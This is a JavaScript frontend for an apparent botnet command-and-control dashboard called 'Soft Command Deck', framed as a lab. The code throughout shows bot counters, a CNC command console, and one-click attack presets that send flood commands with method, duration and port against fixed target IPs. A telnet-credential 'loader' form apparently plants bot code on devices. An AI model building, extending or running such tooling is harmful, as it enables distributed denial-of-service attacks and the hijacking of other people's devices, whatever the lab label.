/* Soft Command Deck.exe frontend */

const $ = (sel) => document.querySelector(sel);
const $$ = (sel) => Array.from(document.querySelectorAll(sel));

const refs = {
  console: $("#console"),
  botCount: $("#bot-count"),
  botCountPanel: $("#bot-count-panel"),
  botStateLabel: $("#bot-state-label"),
  botLabel: $("#bot-label"),
  botStatusText: $("#bot-status-text"),
  botLed: $("#bot-led"),
  botLedSecondary: $("#bot-led-secondary"),
  cncLabel: $("#cnc-label"),
  cncStatusText: $("#cnc-status-text"),
  cncLed: $("#cnc-led"),
  cncLedSecondary: $("#cnc-led-secondary"),
  peerCount: $("#peer-count"),
  lastRefresh: $("#last-refresh"),
  lastCommand: $("#last-command"),
  lastError: $("#last-error"),
  distRows: $("#dist-rows"),
  statusMessage: $("#status-message"),
  terminalStatus: $("#terminal-status"),
  commandInput: $("#cmd-input"),
  sendButton: $("#btn-send"),
  clock: $("#clock"),
  toasts: $("#toasts"),
};

const labState = {
  c2: "185.10.20.100",
  loader: "185.10.20.200",
  sg: "203.0.113.100",
  kr: "210.89.0.100",
};

let localLogClear = false;
let lastBots = 0;
let targetTimers = {};

function setText(el, value) {
  if (el) el.textContent = value;
}

function setLed(el, state) {
  if (!el) return;
  el.classList.remove("ok", "waiting", "down");
  el.classList.add(state);
}

function showToast(title, message, kind = "good") {
  if (!refs.toasts) return;
  const toast = document.createElement("div");
  toast.className = `toast ${kind}`;

  const head = document.createElement("div");
  head.className = "toast-title";
  head.textContent = title;

  const body = document.createElement("div");
  body.className = "toast-body";
  body.textContent = message;

  toast.append(head, body);
  refs.toasts.appendChild(toast);
  setTimeout(() => toast.remove(), 3600);
}

function pushConsole(line, cls = "") {
  if (!refs.console) return;
  const div = document.createElement("div");
  div.className = `line ${cls}`.trim();
  div.textContent = line;
  refs.console.appendChild(div);
  refs.console.scrollTop = refs.console.scrollHeight;

  while (refs.console.children.length > 300) {
    refs.console.removeChild(refs.console.firstChild);
  }
}

function classifyLog(line) {
  if (line.includes("[ERR]")) return "err";
  if (line.includes("[OK]")) return "ok";
  if (line.includes("[CMD]")) return "cmd";
  if (line.includes("[CNC]")) return "cnc";
  return "sys";
}

function renderLogs(logs = []) {
  if (!refs.console || localLogClear) return;
  refs.console.innerHTML = "";

  if (!logs.length) {
    pushConsole("[SYS] no dashboard logs yet", "sys");
    return;
  }

  logs.forEach((line) => pushConsole(line, classifyLog(line)));
}

function setNodeState(id, state) {
  const node = $(`#${id}`);
  if (!node) return;
  node.classList.remove("online", "waiting", "offline");
  if (state) node.classList.add(state);
}

function markTargetActive(target) {
  const node = target === "kr" ? $("#node-kr") : $("#node-sg");
  if (!node) return;

  node.classList.add("active", "online");
  clearTimeout(targetTimers[target]);
  targetTimers[target] = setTimeout(() => {
    node.classList.remove("active");
  }, 8000);
}

function setCnc(up) {
  const state = up ? "ok" : "down";
  setLed(refs.cncLed, state);
  setLed(refs.cncLedSecondary, state);
  setText(refs.cncLabel, up ? "online" : "offline");
  setText(refs.cncStatusText, up ? "online" : "offline");
  setNodeState("node-c2", up ? "online" : "offline");
}

function setBots(n, cncUp = true) {
  const value = Number(n) || 0;
  const state = value > 0 ? "ok" : "waiting";
  const label = value > 0 ? "connected" : "waiting";

  setText(refs.botCount, String(value));
  setText(refs.botLabel, label);
  setText(refs.botStatusText, cncUp ? label : "waiting");
  setText(refs.botStateLabel, value > 0 ? "bots connected" : "waiting for bots");
  setLed(refs.botLed, state);
  setLed(refs.botLedSecondary, state);
  setNodeState("node-bots", value > 0 ? "online" : "waiting");

  if (refs.botCountPanel) {
    refs.botCountPanel.dataset.state = state === "ok" ? "ok" : "waiting";
  }

  if (value !== lastBots && refs.botCount) {
    refs.botCount.classList.remove("pop");
    void refs.botCount.offsetWidth;
    refs.botCount.classList.add("pop");
    lastBots = value;
  }
}

function renderDistribution(distribution = {}) {
  if (!refs.distRows) return;
  refs.distRows.innerHTML = "";
  const entries = Object.entries(distribution).sort(([a], [b]) => a.localeCompare(b));

  if (!entries.length) {
    const tr = document.createElement("tr");
    const td = document.createElement("td");
    td.colSpan = 2;
    td.textContent = "No source tags reported";
    tr.appendChild(td);
    refs.distRows.appendChild(tr);
    return;
  }

  entries.forEach(([source, count]) => {
    const tr = document.createElement("tr");
    const sourceTd = document.createElement("td");
    const countTd = document.createElement("td");
    sourceTd.textContent = source;
    countTd.textContent = String(count);
    tr.append(sourceTd, countTd);
    refs.distRows.appendChild(tr);
  });
}

function updateLab(lab) {
  if (!lab) return;
  labState.c2 = lab.c2 || labState.c2;
  labState.loader = lab.loader || labState.loader;
  labState.sg = lab.target_sg || labState.sg;
  labState.kr = lab.target_kr || labState.kr;

  setText($("#ip-c2"), labState.c2);
  setText($("#ip-loader"), labState.loader);
  setText($("#ip-sg"), labState.sg);
  setText($("#ip-kr"), labState.kr);
  setNodeState("node-loader", "online");
}

function updateLastRefresh() {
  const label = new Date().toLocaleTimeString([], {
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
  });
  setText(refs.lastRefresh, label);
}

function updateFromStatus(data) {
  const cncUp = Boolean(data.cnc_up);
  const botTotal = Number(data.bot_total || 0);

  setCnc(cncUp);
  setBots(botTotal, cncUp);
  renderDistribution(data.distribution || {});
  updateLab(data.lab);
  updateLastRefresh();

  const peers = data.tcp_peers === undefined || data.tcp_peers < 0 ? "-" : String(data.tcp_peers);
  setText(refs.peerCount, peers);

  if (data.error) {
    setText(refs.lastError, data.error);
  } else {
    setText(refs.lastError, "none");
  }

  if (cncUp && botTotal > 0) {
    setText(refs.statusMessage, `CNC online, ${botTotal} bots connected`);
    setText(refs.terminalStatus, "CNC online");
  } else if (cncUp) {
    setText(refs.statusMessage, "CNC online, bot counter waiting");
    setText(refs.terminalStatus, "CNC online, waiting for bots");
  } else {
    setText(refs.statusMessage, data.error || "CNC offline");
    setText(refs.terminalStatus, "CNC offline");
  }

  if (data.logs) renderLogs(data.logs);
}

async function api(path, opts = {}) {
  const res = await fetch(path, {
    headers: { "Content-Type": "application/json" },
    ...opts,
  });
  const text = await res.text();
  let data = {};

  if (text) {
    try {
      data = JSON.parse(text);
    } catch {
      data = { ok: false, error: text };
    }
  }

  if (!res.ok) {
    data.ok = false;
    data.error = data.error || res.statusText || `HTTP ${res.status}`;
  }

  return data;
}

async function refreshStatus({ toast = false } = {}) {
  try {
    const data = await api("/api/status");
    updateFromStatus(data);
    if (toast) showToast("Status refreshed", "Latest CNC and bot counters loaded");
    return data;
  } catch (error) {
    setCnc(false);
    setBots(0, false);
    setText(refs.lastError, error.message);
    setText(refs.statusMessage, "Dashboard API unreachable");
    setText(refs.terminalStatus, "API unreachable");
    pushConsole(`[ERR] ${error.message}`, "err");
    if (toast) showToast("Status failed", error.message, "bad");
    return { ok: false, error: error.message };
  }
}

function setLastCommand(command) {
  setText(refs.lastCommand, command || "none");
}

function attackCommandText({ target, method, duration, dport }) {
  const ip = target === "kr" ? labState.kr : labState.sg;
  return `${method} ${ip} ${duration} dport=${dport}`;
}

async function sendCommand(command) {
  const trimmed = (command || "").trim();
  if (!trimmed) {
    showToast("Command required", "Enter a CNC command first", "warn");
    refs.commandInput?.focus();
    return;
  }

  localLogClear = false;
  setLastCommand(trimmed);
  pushConsole(`[UI] > ${trimmed}`, "cmd");

  try {
    const data = await api("/api/command", {
      method: "POST",
      body: JSON.stringify({ command: trimmed }),
    });

    if (data.ok) {
      showToast("Command OK", trimmed);
      if (data.response) {
        data.response
          .split("\n")
          .filter((line) => line.trim())
          .forEach((line) => pushConsole(line.trim(), "cnc"));
      }
      updateFromStatus(data);
    } else {
      const message = data.error || "Command failed";
      showToast("Command failed", message, "bad");
      setText(refs.lastError, message);
      pushConsole(`[ERR] ${message}`, "err");
      if (data.logs) renderLogs(data.logs);
    }

    await refreshStatus();
  } catch (error) {
    showToast("Command failed", error.message, "bad");
    setText(refs.lastError, error.message);
    pushConsole(`[ERR] ${error.message}`, "err");
  }
}

async function sendAttack(config) {
  const target = config.target;
  const method = config.method || "udp";
  const duration = Number(config.duration || 30);
  const dport = Number(config.dport || 80);
  const commandText = attackCommandText({ target, method, duration, dport });

  localLogClear = false;
  setLastCommand(commandText);
  pushConsole(`[UI] preset -> ${commandText}`, "cmd");

  try {
    const data = await api("/api/attack", {
      method: "POST",
      body: JSON.stringify({ target, duration, method, dport }),
    });

    if (data.ok) {
      const sent = data.command || commandText;
      showToast("Lab preset sent", sent);
      pushConsole(`[OK] ${sent}`, "ok");
      markTargetActive(target);
      updateFromStatus(data);
    } else {
      const message = data.error || "Attack preset failed";
      showToast("Preset failed", message, "bad");
      setText(refs.lastError, message);
      pushConsole(`[ERR] ${message}`, "err");
      if (data.logs) renderLogs(data.logs);
    }

    await refreshStatus();
  } catch (error) {
    showToast("Preset failed", error.message, "bad");
    setText(refs.lastError, error.message);
    pushConsole(`[ERR] ${error.message}`, "err");
  }
}

async function withBusy(button, task) {
  if (button) {
    button.disabled = true;
    button.classList.add("is-busy");
  }

  try {
    await task();
  } finally {
    if (button) {
      button.disabled = false;
      button.classList.remove("is-busy");
    }
  }
}

async function copyBlock(targetId) {
  const target = document.getElementById(targetId);
  const text = target?.textContent?.trim();
  if (!text) return;

  try {
    if (navigator.clipboard?.writeText) {
      await navigator.clipboard.writeText(text);
    } else {
      const area = document.createElement("textarea");
      area.value = text;
      area.setAttribute("readonly", "");
      area.style.position = "fixed";
      area.style.left = "-9999px";
      document.body.appendChild(area);
      area.select();
      document.execCommand("copy");
      area.remove();
    }
    showToast("Copied", targetId.replace("cheat-", ""));
  } catch (error) {
    showToast("Copy failed", error.message, "bad");
  }
}

function tickClock() {
  if (!refs.clock) return;
  refs.clock.textContent = new Date().toLocaleTimeString([], {
    hour: "2-digit",
    minute: "2-digit",
  });
}

/* --- Lab Control (C2 CNC + Loader agent) --- */

let loaderPollTimer = null;

function setLabLed(id, on) {
  setLed($(id), on ? "ok" : "down");
}

function renderLoaderJob(loader) {
  const pre = $("#lab-loader-log");
  if (!pre || !loader) return;

  const lines = [];
  lines.push(`running: ${Boolean(loader.running)}`);
  if (loader.target) lines.push(`target: ${loader.target}`);
  if (loader.exit_code !== null && loader.exit_code !== undefined) {
    lines.push(`exit_code: ${loader.exit_code}`);
  }
  if (loader.ok_line) lines.push(`ok: ${loader.ok_line}`);
  if (loader.error) lines.push(`error: ${loader.error}`);
  if (loader.log_tail) {
    lines.push("---");
    lines.push(loader.log_tail);
  }
  pre.textContent = lines.join("\n");

  if (loader.running) {
    setNodeState("node-loader", "online");
  }
}

function applyLabOverview(data) {
  if (!data) return;

  const cncUp = Boolean(data.cnc?.listening_23);
  setLabLed("#lab-cnc-led", cncUp);
  setText($("#lab-cnc-text"), cncUp ? "up" : "down");

  const agentOk = Boolean(data.loader_agent?.ok);
  setLabLed("#lab-agent-led", agentOk);
  setText($("#lab-agent-text"), agentOk ? "up" : "down");

  const httpUp = Boolean(data.loader?.http?.running || data.loader?.http?.port_listen);
  setLabLed("#lab-http-led", httpUp);
  setText($("#lab-http-text"), httpUp ? "up" : "down");

  setNodeState("node-c2", cncUp ? "online" : "offline");
  setNodeState("node-loader", agentOk ? "online" : "waiting");

  if (data.loader?.loader) renderLoaderJob(data.loader.loader);
  if (data.loader_ip) setText($("#ip-loader"), data.loader_ip);
  if (data.c2_ip) setText($("#ip-c2"), data.c2_ip);
}

async function refreshLabOverview({ toast = false } = {}) {
  try {
    const data = await api("/api/lab/overview");
    applyLabOverview(data);
    if (!data.loader_agent?.ok && data.loader_agent?.error) {
      pushConsole(`[LAB] agent: ${data.loader_agent.error}`, "err");
    }
    if (toast) showToast("Lab status", "C2 + Loader overview refreshed");
    return data;
  } catch (error) {
    setLabLed("#lab-agent-led", false);
    setText($("#lab-agent-text"), "error");
    if (toast) showToast("Lab status failed", error.message, "bad");
    return null;
  }
}

async function labPost(path, body, button, okTitle) {
  await withBusy(button, async () => {
    pushConsole(`[LAB] POST ${path}`, "cmd");
    const data = await api(path, {
      method: "POST",
      body: body ? JSON.stringify(body) : "{}",
    });
    if (data.ok) {
      showToast(okTitle || "OK", data.message || path);
      pushConsole(`[LAB][OK] ${data.message || path}`, "ok");
      if (data.ok_line) pushConsole(data.ok_line, "ok");
    } else {
      const msg = data.error || data.message || "failed";
      showToast("Lab action failed", msg, "bad");
      pushConsole(`[LAB][ERR] ${msg}`, "err");
      if (data.hint) pushConsole(`[LAB] ${data.hint}`, "sys");
    }
    await refreshLabOverview();
    await refreshStatus();
  });
}

async function pollLoaderLogWhileRunning() {
  if (loaderPollTimer) return;
  loaderPollTimer = setInterval(async () => {
    try {
      const data = await api("/api/lab/loader/log");
      const job = data.loader || data;
      if (job && (job.log_tail !== undefined || job.running !== undefined)) {
        renderLoaderJob(job);
      }
      if (job && job.running === false) {
        clearInterval(loaderPollTimer);
        loaderPollTimer = null;
        if (job.ok_line) {
          showToast("Loader finished", job.ok_line);
          pushConsole(`[LAB] ${job.ok_line}`, "ok");
        } else if (job.error) {
          showToast("Loader finished", job.error, "bad");
        } else {
          showToast("Loader finished", `exit ${job.exit_code}`, job.exit_code === 0 ? "good" : "warn");
        }
        await refreshLabOverview();
        await refreshStatus();
      }
    } catch {
      /* ignore transient */
    }
  }, 1500);
}

async function runLoaderFromForm(event) {
  event.preventDefault();
  const ip = $("#loader-ip")?.value?.trim();
  const port = Number($("#loader-port")?.value || 23);
  const user = $("#loader-user")?.value?.trim();
  const pass = $("#loader-pass")?.value ?? "";
  const button = $("#btn-loader-run");

  if (!ip || !user) {
    showToast("Missing fields", "IP and username required", "warn");
    return;
  }

  await withBusy(button, async () => {
    pushConsole(`[LAB] loader ${ip}:${port} ${user}:***`, "cmd");
    const data = await api("/api/lab/loader/run", {
      method: "POST",
      body: JSON.stringify({ ip, port, user, pass }),
    });

    if (data.ok) {
      showToast("Loader started", data.target || ip);
      pushConsole(`[LAB][OK] loader started ${data.target || ip}`, "ok");
      $("#lab-loader-log").textContent = "[lab] running… wait for OK| (do not spam)\n";
      pollLoaderLogWhileRunning();
    } else {
      const msg = data.error || "loader start failed";
      showToast("Loader failed", msg, "bad");
      pushConsole(`[LAB][ERR] ${msg}`, "err");
      if (data.hint) pushConsole(`[LAB] ${data.hint}`, "sys");
    }
    await refreshLabOverview();
  });
}

function focusWindow(id) {
  const el = document.getElementById(id);
  if (!el) return;
  $$(".focus-window").forEach((node) => node.classList.remove("focus-window"));
  el.classList.add("focus-window");
  el.scrollIntoView({ block: "nearest", behavior: "smooth" });
  setTimeout(() => el.classList.remove("focus-window"), 1600);
}

function bind() {
  $("#btn-refresh")?.addEventListener("click", (event) => {
    withBusy(event.currentTarget, () => refreshStatus({ toast: true }));
  });

  $("#command-form")?.addEventListener("submit", (event) => {
    event.preventDefault();
    withBusy(refs.sendButton, () => sendCommand(refs.commandInput?.value || ""));
  });

  $("#btn-clear-log")?.addEventListener("click", () => {
    if (!refs.console) return;
    refs.console.innerHTML = "";
    localLogClear = true;
    pushConsole("[UI] local console view cleared", "cmd");
  });

  $$("[data-cmd]").forEach((button) => {
    button.addEventListener("click", () => {
      withBusy(button, () => sendCommand(button.getAttribute("data-cmd")));
    });
  });

  $$("[data-action='refresh']").forEach((button) => {
    button.addEventListener("click", () => {
      withBusy(button, () => refreshStatus({ toast: true }));
    });
  });

  $$("[data-attack-target]").forEach((button) => {
    button.addEventListener("click", () => {
      withBusy(button, () =>
        sendAttack({
          target: button.getAttribute("data-attack-target"),
          method: button.getAttribute("data-method"),
          duration: button.getAttribute("data-duration"),
          dport: button.getAttribute("data-dport"),
        }),
      );
    });
  });

  $$("[data-copy-target]").forEach((button) => {
    button.addEventListener("click", () => copyBlock(button.getAttribute("data-copy-target")));
  });

  $$("[data-focus-window]").forEach((button) => {
    button.addEventListener("click", () => focusWindow(button.getAttribute("data-focus-window")));
  });

  $("#btn-lab-refresh")?.addEventListener("click", (event) => {
    withBusy(event.currentTarget, () => refreshLabOverview({ toast: true }));
  });
  $("#btn-cnc-start")?.addEventListener("click", (event) => {
    labPost("/api/lab/cnc/start", {}, event.currentTarget, "CNC start");
  });
  $("#btn-cnc-stop")?.addEventListener("click", (event) => {
    labPost("/api/lab/cnc/stop", {}, event.currentTarget, "CNC stop");
  });
  $("#btn-http-start")?.addEventListener("click", (event) => {
    labPost("/api/lab/http/start", {}, event.currentTarget, "HTTP start");
  });
  $("#btn-http-stop")?.addEventListener("click", (event) => {
    labPost("/api/lab/http/stop", {}, event.currentTarget, "HTTP stop");
  });
  $("#lab-loader-form")?.addEventListener("submit", runLoaderFromForm);
}

bind();
tickClock();
setInterval(tickClock, 1000);
refreshStatus();
setInterval(refreshStatus, 4000);
refreshLabOverview();
setInterval(refreshLabOverview, 8000);
